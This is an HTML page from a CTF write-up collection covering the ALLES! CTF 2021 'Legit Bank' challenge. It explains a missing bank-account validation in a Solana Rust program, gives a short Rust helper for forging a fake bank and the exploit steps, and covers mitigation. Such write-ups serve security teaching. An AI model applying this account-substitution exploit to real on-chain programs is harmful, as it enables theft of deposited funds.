@@ -1,0 +1,264 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>ALLES! CTF 2021</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                zoomer-crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#legit-bank">legit-bank</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">zoomer-crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#legit-bank" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">legit-bank</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="alles-ctf-2021"><a class="header-link" href="#alles-ctf-2021"></a>ALLES! CTF 2021</h1>
+
+<h2 id="zoomer-crypto"><a class="header-link" href="#zoomer-crypto"></a>Zoomer Crypto</h2>
+<h3 id="legit-bank"><a class="header-link" href="#legit-bank"></a>Legit Bank</h3>
+<blockquote>
+<p>Jonah1005 (<a href="https://twitter.com/jonah1005w">@jonah1005w</a>)</p>
+</blockquote>
+<p>This challenge is solved after the CTF ends.</p>
+<p>Legit Bank seems to be a simple defi system with five entrypoints. Users can deposit into the bank and receive the interest. Since there&#39;s no on-chain borrowing in the bank, it seems to be some undercollaterized defi protocol like <a href="https://www.maple.finance/">maple finance</a>, <a href="https://truefi.io/">TrueFi</a>, etc. </p>
+<h4 id="issue"><a class="header-link" href="#issue"></a>Issue</h4>
+<p>Bank manager would call <code>invest</code> to send the funds to a receiver. The vulnerability lies in the function <code>invest</code></p>
+<pre class="hljs"><code>
+<span class="hljs-comment">/// See struct BankInstruction for docs</span>
+<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">invest</span></span>(_program_id: &amp;Pubkey, accounts: &amp;[AccountInfo], amount: <span class="hljs-built_in">u64</span>) -&gt; ProgramResult {
+    <span class="hljs-keyword">let</span> [bank_info, vault_info, vault_authority_info, dest_token_account_info, manager_info, _spl_token_program] =
+        array_ref![accounts, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>];
+    <span class="hljs-comment">// verify that manager has approved</span>
+    <span class="hljs-keyword">if</span> !manager_info.is_signer {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">Err</span>(ProgramError::MissingRequiredSignature);
+    }
+
+    <span class="hljs-comment">// verify that manager is correct</span>
+    <span class="hljs-keyword">let</span> bank: Bank = Bank::try_from_slice(&amp;bank_info.data.borrow())?;
+    <span class="hljs-keyword">if</span> bank.manager_key != manager_info.key.to_bytes() {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">Err</span>(<span class="hljs-number">0xbeefbeef</span>.into());
+    }
+
+    <span class="hljs-comment">// verify that the vault is correct</span>
+    <span class="hljs-keyword">if</span> vault_info.key.as_ref() != &amp;bank.vault_key {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">Err</span>(ProgramError::InvalidArgument);
+    }
+
+    <span class="hljs-comment">// verify that enough money is left in reserve</span>
+    <span class="hljs-keyword">let</span> vault = spl_token::state::Account::unpack(&amp;vault_info.data.borrow())?;
+    <span class="hljs-keyword">if</span> (vault.amount - amount) * <span class="hljs-number">100</span> &lt; bank.total_deposit * <span class="hljs-built_in">u64</span>::from(bank.reserve_rate) {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">Err</span>(<span class="hljs-number">0xfeedf00d</span>.into());
+    }
+
+    <span class="hljs-comment">// transfer tokens to manager</span>
+    invoke_signed(
+        &amp;spl_token::instruction::transfer(
+            &amp;spl_token::ID,
+            &amp;vault_info.key,
+            &amp;dest_token_account_info.key,
+            &amp;vault_authority_info.key,
+            &amp;[],
+            amount,
+        )?,
+        &amp;[
+            vault_info.clone(),
+            dest_token_account_info.clone(),
+            vault_authority_info.clone(),
+        ],
+        &amp;[&amp;[vault_info.key.as_ref(), &amp;[bank.vault_authority_seed]]],
+    )?;
+
+    <span class="hljs-literal">Ok</span>(())
+}</code></pre><p>The program would check whether the <code>bank_manager</code> is signed. </p>
+<p>Here&#39;s how the problem is. The program reads the address of <code>bank_manager</code> from the <code>bank</code>. Since the bank is provieded by the user, an attacker can provide a fake bank and replace the <code>bank_manger</code> with his own address. </p>
+<p>I simply create a new function in the program to clone a bank and replace the bank_manager.</p>
+<pre class="hljs"><code><span class="hljs-comment">/// See struct BankInstruction for docs</span>
+fn clone(_program_id: &amp;Pubkey, accounts: &amp;<span class="hljs-literal">[A<span class="hljs-identifier">ccountInfo</span>]</span>) -&gt; ProgramResult {
+    <span class="hljs-keyword">let</span> <span class="hljs-literal">[<span class="hljs-identifier">target_bank_info</span>, <span class="hljs-identifier">cloned_bank_info</span>, <span class="hljs-identifier">manager_info</span>]</span> =
+        array_ref!<span class="hljs-literal">[<span class="hljs-identifier">accounts</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>]</span>;
+
+    <span class="hljs-comment">// verify that manager is correct</span>
+    <span class="hljs-keyword">let</span> bank: Bank = Bank::<span class="hljs-keyword">try</span><span class="hljs-constructor">_from_slice(&amp;<span class="hljs-params">target_bank_info</span>.<span class="hljs-params">data</span>.<span class="hljs-params">borrow</span>()</span>)?;
+    <span class="hljs-keyword">let</span> mut cloned_bank: Bank = Bank::<span class="hljs-keyword">try</span><span class="hljs-constructor">_from_slice(&amp;<span class="hljs-params">cloned_bank_info</span>.<span class="hljs-params">data</span>.<span class="hljs-params">borrow</span>()</span>)?;
+    cloned_bank.manager_key = manager_info.key.<span class="hljs-keyword">to</span><span class="hljs-constructor">_bytes()</span>;
+    cloned_bank.vault_key = bank.vault_key;
+    cloned_bank.vault_authority_seed = bank.vault_authority_seed;
+    cloned_bank.reserve_rate = bank.reserve_rate;
+    cloned_bank.serialize(&amp;mut &amp;mut cloned_bank_info.data.borrow<span class="hljs-constructor">_mut()</span><span class="hljs-literal">[..]</span>)?;
+
+    <span class="hljs-constructor">Ok(()</span>)
+}</code></pre><h4 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h4>
+<ol class="list">
+<li>Create a data account and clone a fake bank</li>
+<li>Replace <code>manager_key</code> in the fake bank. Since the fake bank is created by the attacker, we can replace whatever field we want.</li>
+<li>Call <code>invest</code> with the fake_bank and invest to ourself.  Note: the rest of the parameters should be the same as the token belongs to the vault and authority.</li>
+</ol>
+<h4 id="mitigation"><a class="header-link" href="#mitigation"></a>Mitigation</h4>
+<p>Since Solana handles data differently from Ethereum, users would have to specify the data their using and provided info in the transactions. As this breaks dependency between transactions and boosts the network efficiency, developers from the Ethereum community may have some false assumptions of program&#39;s storage. <a href="https://twitter.com/solendprotocol/status/1428611597941891082">Solend&#39;s been hacked</a> for the similar issue. <a href="https://docs.google.com/document/d/1-WoQwT1QrPEX-r4N-fDamRQ50LM8DsdsOyq1iTabS3Q/edit">Report</a> </p>
+<p>The legit bank checks the correctness of bank address in <code>deposit</code> and <code>withdraw</code>, however, the check is missed in the invest function.</p>
+<pre class="hljs"><code>    <span class="hljs-comment">// check that the bank account is correct</span>
+    <span class="hljs-keyword">let</span> (bank_address, _) = Pubkey::find_program_address(&amp;[], program_id);
+    <span class="hljs-keyword">if</span> *bank_info.key != bank_address {
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">Err</span>(ProgramError::InvalidArgument);
+    }</code></pre><p>Or a more simple way is to check whether the <code>bank.owner == program_id</code> as only account&#39;s owner can modify its data. </p>
+<p>The flag is:</p>
+<pre class="hljs"><code>ALLES!{<span class="hljs-keyword">Some</span> Smart Contracts are <span class="hljs-keyword">not</span> very smart :(}</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
